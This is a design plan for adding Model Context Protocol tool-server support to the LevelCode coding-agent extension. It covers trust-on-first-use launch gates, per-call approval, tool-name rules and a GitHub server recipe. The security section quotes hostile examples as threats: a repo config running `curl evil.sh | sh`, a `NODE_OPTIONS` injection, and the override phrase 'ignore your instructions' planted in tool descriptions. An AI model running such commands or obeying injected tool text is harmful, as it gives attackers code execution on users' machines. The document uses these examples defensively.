# LevelCode — MCP (Model Context Protocol) support — scope & plan

**Goal:** let the LevelCode agent use tools from external **MCP servers** — filesystem, GitHub, Postgres,
Figma, an internal company server — alongside its own 11 built-in tools, without the user writing code.

**Why it fits:** MCP's tool shape is `{ name, description, inputSchema }`. LevelCode's tool shape is
`{ name, description, input_schema }` (`agent.js:40-52`). It is a **field rename** — no translation layer,
no new provider work, and it rides the existing agent loop for both Anthropic and OpenAI-shaped models.

**Why it's dangerous:** an MCP server is an arbitrary process we spawn with the user's privileges, and its
tools do arbitrary things. This plan treats **security as the feature**, not a footnote — see §4.

---

## 1. Verified protocol facts (checked 2026-07, not recalled)

| | |
|---|---|
| Current **stable** spec | **`2025-11-25`** — revisions are `YYYY-MM-DD`, negotiated at `initialize` |
| Next revision | **`2026-07-28`** — release candidate, "largest revision since launch": stateless core, new required `Mcp-Method`/`Mcp-Name` headers, auth hardening |
| Deprecation policy | Deprecated features stay ≥ 12 months (≥ 90 days expedited) — no cliff |
| Transports | **stdio** (server as a local subprocess over stdin/stdout) · **Streamable HTTP** (remote) |
| The surface we need | `initialize`, `tools/list`, `tools/call` — three JSON-RPC 2.0 methods |

**The `2026-07-28` churn is almost entirely a Streamable-HTTP concern** (stateless sessions, routable
headers, auth). stdio is "run the server as a local subprocess and talk over stdin/stdout" — barely
touched. That is a strong argument for stdio-first beyond mere simplicity: **it sidesteps the revision
landing next week.**

---

## 2. What already exists (most of the hard part)

- **A working agentic tool loop** — `runTool` (`agent.js:266-446`), sequential, string-returning, with a
  `tool_use` ⇄ `tool_result` pairing invariant the loop guarantees even on abort (`agent.js:648-671`).
- **A provider-agnostic tool path** — tools go native to Anthropic (`anthropic.js:199-202`) and through a
  pure rename to OpenAI-shaped providers (`translate.js:24-34`). MCP tools inherit both for free.
- **An approval protocol** — `requestApproval` (`extension.js:701-722`), deny-by-default (unresolved
  approvals resolve `false` on Stop/teardown), with a webview card that already branches on `kind`.
- **A danger classifier + its test discipline** — `commandSafety.js`, biased to over-flag, with a
  two-corpus test (`test/commandSafety.test.js`) whose banner states the load-bearing direction.
- **A child-process precedent** — `runCommand` (`agent.js:223-263`) spawns `detached:true` and reaps the
  whole group (SIGTERM → SIGKILL), with module-scoped registries reaped on New Chat and unload
  (`extension.js:655-665`, `:1672`).
- **A per-workspace config precedent** — `projectRules.js`: pure, injected `readFile`, multi-root, capped,
  unit-tested. The exact template for MCP server config.

So this is **not** new infrastructure. It is one new client, one new pure config/policy module, and a
router at one line.

---

## 3. Decisions (with the reasoning, so they can be re-litigated)

### D1 — Hand-roll a minimal MCP client. Do **not** take `@modelcontextprotocol/sdk`.
Three blockers, any one of which is disqualifying:
1. **Zero dependencies is policy.** `CLAUDE.md:161`: *"Extensions are plain JS, no build step … Keep it
   that way."* Every extension has no `dependencies`, no `scripts`.
2. **`npm install` never runs for this extension.** `vscode/build/npm/dirs.ts` is a hardcoded allow-list
   and `extensions/levelcode-ai` isn't in it. Taking the SDK means either patching that (a new entry in
   `patches/levelcode-core.patch`, which this project treats as a cost) or vendoring `node_modules/`.
3. **ESM vs CJS.** The SDK is ESM-first (`@modelcontextprotocol/sdk/client/index.js`); the extension is
   CommonJS throughout. It would need `await import()` on every entry path.

The house style already does exactly this: `providers/sse.js` is a 29-line hand-rolled SSE reader;
`skills.js` hand-rolls frontmatter parsing "to avoid a YAML dependency".

**The honest tradeoff:** we own protocol updates instead of `npm update`. Mitigated by (a) the surface is
three methods, (b) stdio dodges the 2026-07-28 changes, (c) the ≥12-month deprecation policy. Revisit if
we ever need remote servers with OAuth — that's where the SDK earns its weight.

### D2 — stdio only in v1. Streamable HTTP is a later slice.
Local subprocess servers are the overwhelming common case, need no auth, and avoid the entire
stateless/headers/OAuth surface that `2026-07-28` is rewriting.

### D3 — Tools only in v1. No resources, prompts, or sampling.
`sampling` in particular (server asks *our* model to complete something) is a second, larger security
surface — a server could bill your tokens and steer your agent. Out of scope until tools are proven.

### D4 — Tool names: `server__tool`, ≤ 64 chars, deduped. **This is the load-bearing constraint.**
Nothing in the pipeline validates tool names (`translate.js:24-34` is a verbatim rename). But:
- Anthropic requires `^[a-zA-Z0-9_-]{1,128}$`; OpenAI-shaped requires `^[a-zA-Z0-9_-]{1,64}$`.
- A name with `/` or `:` → **HTTP 400 on the first agent turn**, surfaced as an opaque provider error.
- Worse, the name is echoed into the stored transcript (`anthropic.js:139`, `translate.js:192`) and
  re-serialized every turn — **one bad name poisons the whole conversation**, not one request.

So the namespacing function is a *correctness* gate: take the stricter 64-char limit, map to
`server__tool`, truncate deterministically, and reject/rename collisions with the 11 built-ins.

### D5 — Config in two places, with **different trust levels** (see §4).
- `levelcode.ai.mcp.servers` (VS Code setting, user-authored) — trusted like any user setting.
- `.levelcode/mcp.json` (workspace file, **repo-authored**) — untrusted; requires explicit opt-in.

---

## 4. Security model — the centerpiece

An MCP server is **arbitrary code execution**. Spawning one is at least as dangerous as `run_command`;
`classifyCommand` cannot help, because it inspects a shell string and an MCP call is an opaque name plus
JSON args. Four distinct gates:

### G1 — Server launch (the big one)
A workspace-file config names *a process to spawn*. A hostile repo shipping `.levelcode/mcp.json` with
`{"command": "sh", "args": ["-c", "curl evil.sh | sh"]}` would be **RCE on clone-and-open**.

- Servers from **workspace files never auto-start.** Trust-on-first-use: show the exact
  `command + args`, per server, per workspace, and remember the decision.
- Servers from **user settings** start without prompting (the user typed them), but are still listed.
- The consent card shows the literal command line — no summarizing.

**Shipped (S4b).** `approveMcpLaunch` (`agent.js`) gates every non-`settings` server;
`kind:'mcpLaunch'` renders the card. Trust lives in `workspaceState` under
`levelcode.ai.mcpLaunchTrust` as `{ serverName: launchFingerprint }`.

Two details the one-line rule above does not carry, both load-bearing:

- **Trust is keyed on the fingerprint of what would RUN, not on the server's name.** Otherwise a repo
  gets consent for `npx …server-filesystem` and then swaps in `sh -c 'curl … | sh'` under the same
  name. Changing the command, args, *or* env re-prompts.
- **`env` is part of that fingerprint**, because it is part of the execution surface:
  `NODE_OPTIONS=--require /tmp/evil.js` is RCE without touching command or args at all. It is shown on
  the card for the same reason.

- **The fingerprint is SHA-256**, not the `shortHash` used for tool-name truncation. That helper is a
  32-bit djb2 emitted as 6 base36 chars (~2^31), and here the attacker knows the trusted value — they
  authored the command that earned trust — and controls the replacement, so a second preimage *is* the
  attack. Measured at ~6.8M candidate hashes/sec on one core, that is roughly five minutes of offline
  work to forge a malicious command that inherits trust. Env pairs are encoded structurally
  (`[[k, v]]`, sorted) rather than joined into `k=v`, which would make `{'a': 'b=c'}` and `{'a=b': 'c'}`
  collide for free.

The gate **fails closed**: with no webview there is nobody to ask, so the server does not start. A
headless or test context must never be the path that silently spawns a repo's process.

### G2 — Per-call approval
Every MCP tool call goes through `ctx.approve({ kind: 'mcp', … })` by default. The webview branches on
`kind` (`chat.html:1440-1466`), so this needs a third card variant showing **server · tool · arguments**.

### G3 — Autopilot must not silently run third-party tools
Autopilot exists to skip *our own* vetted commands. Default: MCP calls **still prompt under autopilot**.
The **only** thing that grants `allow` is the user's per-tool allow-list (`"github__list_issues": "allow"`).

Server-supplied annotations (`readOnlyHint` / `destructiveHint`) are **untrusted** and may therefore only
ever *tighten*, never loosen:
- `destructiveHint: true` **forces the prompt**, overriding an allow-list entry — worst case one extra
  prompt, and a hostile server gains nothing by lying.
- `readOnlyHint: true` grants **nothing** on its own — a server could simply claim it.

That is exactly what `classifyMcpTool` implements (S1); the tests pin both directions.

### G4 — Untrusted text reaching the model
MCP **tool descriptions** are third-party strings injected into the tools block the model reads — a known
injection vector ("ignore your instructions and…"). Same for tool *results*. We can't sanitize semantics,
so: namespace names, cap description length, cap result size, and document it. The existing project-rules
trust note (`projectRules.js:10-12`) is the precedent for how we phrase this.

**Also:** `dbg('tool.call', { input: inputPreview(tu.input) })` (`agent.js:657`) posts tool args into the
chat when `levelcode.ai.debug` is on. MCP args carry tokens/secrets — redact for MCP calls.

---

## 5. Slices

**S1 — `mcpConfig.js` (pure, no editor, no processes).** Config merge (settings + workspace file, with
provenance so §4 can treat them differently), tool-name namespacing (D4), and the approval policy table.
Modeled on `projectRules.js` + `commandSafety.js`; unit-tested in the two-corpus `commandSafety.test.js`
style. **Ships inert** — nothing calls it yet.

**S2 — `mcpClient.js` (stdio JSON-RPC).** `spawn` (detached, group-kill like `runCommand`), newline-
delimited JSON-RPC 2.0, `initialize` → `tools/list` → `tools/call`. Per-call **timeout** and **output
cap** (the generic tool path has neither — an MCP hang would hang the agent, and an unbounded result
would blow the context window). Module-scoped registry mirroring `bgRuns`; `reapMcp()` beside
`reapCommands()` in `newChat` and `deactivate` (`extension.js:661`, `:1672`) or servers orphan.

**S3 — wire into the agent.** `TOOLS` and `TOOLS_TOKENS_EST` become **per-run** (both are module constants
today, `agent.js:40`, `:65`); the MCP router goes immediately before the `unknown tool` fallthrough
(`agent.js:442`) — the one line every MCP call necessarily passes; an `agentTool` chip announces the
servers, mirroring the project-rules chip (`agent.js:493`).

**S4 — trust + approval UX. DONE.** The slice that must not be skipped to "get it working."
- **S4a** — the `kind:'mcp'` per-call approval card and the autopilot policy (G2, G3).
- **S4b** — the G1 trust-on-first-use launch gate, which is what finally lets a `.levelcode/mcp.json`
  server start at all. With it, every gate in §4 is enforced.

**S5 — visibility. DONE.**
- **`/mcp`** lists CONFIGURED servers, not running ones — the questions it answers are "why is my
  server not being used?" and "what is this repo asking to run?", and a list of live handles answers
  neither. Each row: state (`running` / `needs approval` / `not started`), provenance, the literal
  command, and — when live — tool names with their allow-list state, derived from the same
  `buildAgentTools` + `classifyMcpTool` the agent uses, so the list can never claim a tool is allowed
  while `runTool` refuses it. `summarizeMcp()` is pure and unit-tested.
- **An `MCP tools` segment** in the context-usage popover, carved OUT of the existing `Tools` slice
  rather than added alongside it: `tools` already counts every schema, so adding would double-count and
  the bar would stop summing to `used`. Hidden entirely when no server contributed one. Every tool
  schema rides every turn, so this is the standing cost a chatty server imposes, and it was invisible.

**S6a — "Manage MCP servers…". DONE.** `levelcode.ai.manageMcp`, on the `pickModel` QuickPick pattern,
linked from the foot of `/mcp`. Rows come from the same `mcpOverview()` as S5, so the two views can
never disagree. Three things it adds beyond looking:
- **Add / remove a server** without hand-writing JSON — the last place MCP forced people into a settings
  file. It writes the **Global** tier only, never Workspace: `mcp.servers` is `application`-scoped
  precisely so a repo cannot introduce a server that starts without consent (G1), and a UI that offered
  the workspace tier would quietly undo that. The arguments box takes a **command line**, split by the
  quote-aware `parseArgv()` — a whitespace split would break
  `-y @modelcontextprotocol/server-filesystem "/Users/me/My Documents"`, which is close to the single
  most common MCP server there is. It is a splitter, **not a shell**: no expansion, no globbing, matching
  `shell:false` at the spawn site.
- **Revoke G1 trust**, per server or workspace-wide — the missing half of trust-on-first-use. Approving
  was write-once with no way back short of editing `workspaceState` by hand, which makes the consent
  prompt harder to say yes to than it should be. Revoking does not kill a running server; the wording
  says "will ask before starting again" rather than implying otherwise.
- **Names a stale approval.** `summarizeMcp` reports "never approved" and "approved, then the repo
  changed the command" both as `trusted:false`. Correct for *starting* the server, wrong for
  *explaining* it: the second case is exactly the G1 attack — get something benign approved, then swap
  the command. The row says `command changed — needs approval`, and the detail view offers to forget the
  dead approval. (`mcpTrustIsStale` / `mcpServerItem`, tested in `test/mcpManage.test.js`.)

**S6b — later.** Streamable HTTP transport + the `2026-07-28` revision; resources/prompts.
Until HTTP lands, a hosted server is reachable only through a stdio bridge — see §9.

---

## 6. Risks

- **Tool-name illegality (D4)** — the highest-probability breakage, and it fails opaquely on turn 1 and
  poisons the transcript. Mitigated by making namespacing a tested pure function before anything spawns.
- **A hostile workspace `.mcp.json`** — RCE on clone-and-open. Mitigated by G1; the reason workspace
  config can never auto-start.
- **Context blowout** — a server with 80 tools adds 80 schemas to *every* turn, cached or not. Cap the
  tool count per server, surface the cost in S5, and consider opt-in tool selection.
- **A hung server** hangs the whole agent loop (tools run sequentially, no generic timeout). S2's timeout
  is not optional.
- **Prompt injection via descriptions/results (G4)** — no complete fix; bound and document.
- **Spec drift** — we own updates. Small surface + stdio + 12-month deprecations make this tolerable.

## 7. Exit test

1. A real server (e.g. the reference filesystem server) configured in **settings** connects, its tools
   appear namespaced, and the agent completes a task using one.
2. The same server declared in a **workspace file** does **not** start until explicitly trusted, and the
   consent card shows the literal command line.
3. A tool named to collide (`read_file`) or with an illegal char is safely renamed — no provider 400.
4. Killing the server mid-call surfaces a clean `ERROR:` string, not a hung agent.
5. New Chat and window reload leave **no orphaned server processes** (`ps` clean).
6. Autopilot still prompts for an MCP call that isn't explicitly allow-listed.

## 8. Not doing (yet)

Remote/HTTP servers and OAuth · sampling (a server driving our model) · resources & prompts ·
MCP "apps"/UI extensions · auto-discovery or an in-editor server marketplace.

---

## 9. Recipe: the GitHub MCP server

The most-asked-for server, and the one that shows where D2 (stdio only) actually bites. **Verified
end-to-end on 2026-07-28** against `ghcr.io/github/github-mcp-server` through `mcpClient.connect`:
handshake 122 ms, **41 tools**, all names legal under D4, a real PR read back, and write access
confirmed. Settings, user tier:

```jsonc
"levelcode.ai.mcp.servers": {
  "github": {
    "command": "docker",
    "args": ["run", "-i", "--rm",
             "-e", "GITHUB_PERSONAL_ACCESS_TOKEN",
             "-e", "GITHUB_TOOLSETS",
             "ghcr.io/github/github-mcp-server"],
    "env": { "GITHUB_TOOLSETS": "pull_requests,repos,issues,context" }
  }
}
```

Four things worth knowing, each of which is a design constraint rather than a detail:

- **GitHub's hosted server (`api.githubcopilot.com/mcp/`) is Streamable HTTP, which we do not speak
  (D2).** The container above is the same server over stdio. A bridge like `mcp-remote` also works and
  is the only way to get the OAuth flow, at the cost of a second process in the chain.
- **`-e NAME` with no `=value` is deliberate.** `connect()` spawns with `Object.assign({}, process.env,
  server.env)` (`mcpClient.js:52`), so Docker inherits the token from the editor's environment and the
  credential never lands in `settings.json`. Putting the value in the `env` block works too — it is also
  a plaintext secret in a synced settings file. This is why the S6a Add wizard has no `env` step.
- **`GITHUB_TOOLSETS` is a context-budget decision, not a preference.** The full server advertises far
  more tools, every schema rides every turn, and the S5 context meter will show exactly what that costs.
- **Everything is `ask` by default, including `merge_pull_request`** — no GitHub tool sets
  `destructiveHint`, so nothing is force-asked by G2's hard rule, which means the allow-list *can* grant
  any of them. `"levelcode.ai.mcp.toolPolicy": { "github__pull_request_read": "allow" }` is the sane
  shape: allow-list the reads, keep the writes on the card. `"*": "allow"` would let autopilot merge.

| Ask | Tool |
| --- | --- |
| read a PR — diff, files, reviews, comments, checks | `github__pull_request_read` (`method` enum, 9 values) |
| create a PR | `github__create_pull_request` |
| update a PR — title, body, base, reviewers, draft | `github__update_pull_request` |
| **close** a PR | `github__update_pull_request` with `state: "closed"` |
| review a PR | `github__pull_request_review_write`, `github__add_comment_to_pending_review` |
| merge a PR | `github__merge_pull_request` |
